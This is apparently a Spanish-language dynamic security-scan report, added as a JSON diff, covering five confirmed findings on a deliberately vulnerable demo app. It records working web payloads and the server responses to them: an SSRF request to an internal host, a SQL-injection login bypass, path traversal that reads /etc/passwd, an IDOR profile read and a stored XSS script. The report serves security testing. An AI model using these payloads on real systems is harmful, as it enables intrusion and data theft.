@@ -1,0 +1,53 @@
+{
+  "vulnerabilidades_reportadas": 5,
+  "vulnerabilidades_vulnerables": 5,
+  "timestamp": "2025-08-14T18:27:50.440942",
+  "tipo_analisis": "dinamico",
+  "vulnerabilidades": [
+    {
+      "nombre": "Server-Side Request Forgery (SSRF)",
+      "estado": "vulnerable",
+      "severidad": "Crítico",
+      "detalles": "{\n  \"nombre\": \"SSRF - Acceso a recurso interno via /api/fetch\",\n  \"estado\": \"vulnerable\",\n  \"evidencia\": \"La respuesta HTTP 200 contiene el flag interno INTERNAL_SECRET_FLAG{ssrf_test_successful_internal_access} y detalles del servidor interno, evidenciando acceso a recursos internos mediante SSRF.\",\n  \"payload_usado\": \"GET /api/fetch?api_key=insecure_api_key_123&url=http://internal-server/secret.txt\",\n  \"respuesta_servidor\": \"HTTP/1.1 200 OK\\nServer: gunicorn\\nDate: Thu, 14 Aug 2025 21:26:00 GMT\\nConnection: close\\nContent-Type: text/html; charset=utf-8\\nContent-Length: 394\\n\\nINTERNAL_SECRET_FLAG{ssrf_test_successful_internal_access}\\n\\nThis is a secret file that should only be accessible internally.\\nIf you can read this via SSRF, the vulnerability test was successful.\\n\\nInternal server details:\\n- Hostname: internal-server\\n- Service: nginx\\n- Purpose: SSRF testing target\\n- Timestamp: 2024-01-01T00:00:00Z\\n\\nDo not expose this file externally in production environments.\"\n}",
+      "evidencia": "La respuesta HTTP 200 contiene el flag interno INTERNAL_SECRET_FLAG{ssrf_test_successful_internal_access} y detalles del servidor interno, evidenciando acceso a recursos internos mediante SSRF.",
+      "payload_usado": "GET /api/fetch?api_key=insecure_api_key_123&url=http://internal-server/secret.txt",
+      "respuesta_servidor": "HTTP/1.1 200 OK\nServer: gunicorn\nDate: Thu, 14 Aug 2025 21:26:00 GMT\nConnection: close\nContent-Type: text/html; charset=utf-8\nContent-Length: 394\n\nINTERNAL_SECRET_FLAG{ssrf_test_successful_internal_access}\n\nThis is a secret file that should only be accessible internally.\nIf you can read this via SSRF, the vulnerability test was successful.\n\nInternal server details:\n- Hostname: internal-server\n- Service: nginx\n- Purpose: SSRF testing target\n- Timestamp: 2024-01-01T00:00:00Z\n\nDo not expose this file externally in production environments."
+    },
+    {
+      "nombre": "SQL Injection",
+      "estado": "vulnerable",
+      "severidad": "Alto",
+      "detalles": "{\n  \"nombre\": \"SQL Injection - Bypass de autenticación en login\",\n  \"estado\": \"vulnerable\",\n  \"evidencia\": \"La petición POST /login con payload 'admin' OR '1'='1' -- permitió bypass de autenticación, se obtuvo una sesión válida (Set-Cookie) y, tras usar esa sesión, la página muestra 'Bienvenido admin!'.\",\n  \"payload_usado\": \"username=admin%27+or+%271%27%3D%271+--&password=admin%27+or+%271%27%3D%271+-- (Decoded: \\\"admin' or '1'='1 -- \\\")\",\n  \"respuesta_servidor\": \"Fragmento 1: HTTP/1.1 302 FOUND; Location: /; Set-Cookie: session=[redacted]; …; HTML: Redirecting...  Fragmento 2: HTTP/1.1 200 OK; Content includes '¡Bienvenido admin!'\"\n}",
+      "evidencia": "La petición POST /login con payload 'admin' OR '1'='1' -- permitió bypass de autenticación, se obtuvo una sesión válida (Set-Cookie) y, tras usar esa sesión, la página muestra 'Bienvenido admin!'.",
+      "payload_usado": "username=admin%27+or+%271%27%3D%271+--&password=admin%27+or+%271%27%3D%271+-- (Decoded: \"admin' or '1'='1 -- \")",
+      "respuesta_servidor": "Fragmento 1: HTTP/1.1 302 FOUND; Location: /; Set-Cookie: session=[redacted]; …; HTML: Redirecting...  Fragmento 2: HTTP/1.1 200 OK; Content includes '¡Bienvenido admin!'"
+    },
+    {
+      "nombre": "Local File Inclusion (LFI)",
+      "estado": "vulnerable",
+      "severidad": "Alto",
+      "detalles": "{\n  \"nombre\": \"Local File Inclusion (LFI) - Path Traversal en /download\",\n  \"estado\": \"vulnerable\",\n  \"evidencia\": \"La respuesta HTTP 200 contiene el contenido del archivo /etc/passwd cuando se solicita /download?file=../../etc/passwd, indicando acceso no autorizado a archivos del sistema.\",\n  \"payload_usado\": \"GET /download?file=../../etc/passwd\",\n  \"respuesta_servidor\": \"HTTP/1.1 200 OK\\nServer: gunicorn\\nDate: Thu, 14 Aug 2025 21:26:35 GMT\\nConnection: close\\nContent-Disposition: attachment; filename=passwd\\nContent-Type: application/octet-stream\\nContent-Length: 839\\nLast-Modified: Mon, 11 Aug 2025 00:00:00 GMT\\nCache-Control: no-cache\\nETag: \\\"1754870400.0-839-393413677\\\"\\n\\nroot:x:0:0:root:/root:/bin/bash\\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\\nsync:x:4:65534:sync:/bin:/bin/sync\\n...\"\n}",
+      "evidencia": "La respuesta HTTP 200 contiene el contenido del archivo /etc/passwd cuando se solicita /download?file=../../etc/passwd, indicando acceso no autorizado a archivos del sistema.",
+      "payload_usado": "GET /download?file=../../etc/passwd",
+      "respuesta_servidor": "HTTP/1.1 200 OK\nServer: gunicorn\nDate: Thu, 14 Aug 2025 21:26:35 GMT\nConnection: close\nContent-Disposition: attachment; filename=passwd\nContent-Type: application/octet-stream\nContent-Length: 839\nLast-Modified: Mon, 11 Aug 2025 00:00:00 GMT\nCache-Control: no-cache\nETag: \"1754870400.0-839-393413677\"\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\n..."
+    },
+    {
+      "nombre": "Insecure Direct Object Reference (IDOR)",
+      "estado": "vulnerable",
+      "severidad": "Medio",
+      "detalles": "{\n  \"nombre\": \"Insecure Direct Object Reference (IDOR) - Perfil de usuario\",\n  \"estado\": \"vulnerable\",\n  \"evidencia\": \"La solicitud GET a /profile/2 sin controles de acceso devuelve el perfil de user1. La página muestra Username, Email y Role, junto con información de depuración (User ID: 2, Is Admin: False), lo que indica que se exponen datos de otros usuarios.\",\n  \"payload_usado\": \"GET /profile/2\",\n  \"respuesta_servidor\": \"<!DOCTYPE html><html><head><title>Vulnerable App</title></head><body>...<h2>user1's Profile</h2>...<p><strong>Username:</strong> user1</p><p><strong>Email:</strong> user1@example.com</p><p><strong>Role:</strong> Regular User</p>...<div class=\\\"mt-4 p-3 bg-light rounded\\\"><h5>Debug Information (Insecure - For demonstration only)</h5><p class=\\\"small text-muted mb-0\\\">User ID: 2</p><p class=\\\"small text-muted\\\">Is Admin: False</p><p class=\\\"small text-danger\\\">IDOR Vulnerability: This page shows sensitive user information without proper authorization checks.</p></div>...</body></html>\"\n}",
+      "evidencia": "La solicitud GET a /profile/2 sin controles de acceso devuelve el perfil de user1. La página muestra Username, Email y Role, junto con información de depuración (User ID: 2, Is Admin: False), lo que indica que se exponen datos de otros usuarios.",
+      "payload_usado": "GET /profile/2",
+      "respuesta_servidor": "<!DOCTYPE html><html><head><title>Vulnerable App</title></head><body>...<h2>user1's Profile</h2>...<p><strong>Username:</strong> user1</p><p><strong>Email:</strong> user1@example.com</p><p><strong>Role:</strong> Regular User</p>...<div class=\"mt-4 p-3 bg-light rounded\"><h5>Debug Information (Insecure - For demonstration only)</h5><p class=\"small text-muted mb-0\">User ID: 2</p><p class=\"small text-muted\">Is Admin: False</p><p class=\"small text-danger\">IDOR Vulnerability: This page shows sensitive user information without proper authorization checks.</p></div>...</body></html>"
+    },
+    {
+      "nombre": "Stored Cross-Site Scripting (XSS)",
+      "estado": "vulnerable",
+      "severidad": "Bajo",
+      "detalles": "```json\n{\n  \"nombre\": \"Stored Cross-Site Scripting (XSS) en comentarios\",\n  \"estado\": \"vulnerable\",\n  \"evidencia\": \"POST /comment con payload content=<script>alert(\\\"XSS\\\");</script> ejecutado; luego se accedió a GET /document/1 y la respuesta HTML contiene el snippet del script dentro de los comentarios, evidenciando almacenamiento del XSS.\",\n  \"payload_usado\": \"<script>alert(\\\"XSS\\\");</script>\",\n  \"respuesta_servidor\": \"_fragmento relevante de la respuesta_: <div class=\\\"mb-1\\\"><script>alert(\\\"XSS\\\")</script></div> dentro de la sección de comentarios de /document/1\"\n}\n```",
+      "evidencia": "POST /comment con payload content=<script>alert(\"XSS\");</script> ejecutado; luego se accedió a GET /document/1 y la respuesta HTML contiene el snippet del script dentro de los comentarios, evidenciando almacenamiento del XSS.",
+      "payload_usado": "<script>alert(\"XSS\");</script>",
+      "respuesta_servidor": "_fragmento relevante de la respuesta_: <div class=\"mb-1\"><script>alert(\"XSS\")</script></div> dentro de la sección de comentarios de /document/1"
+    }
+  ]
+}
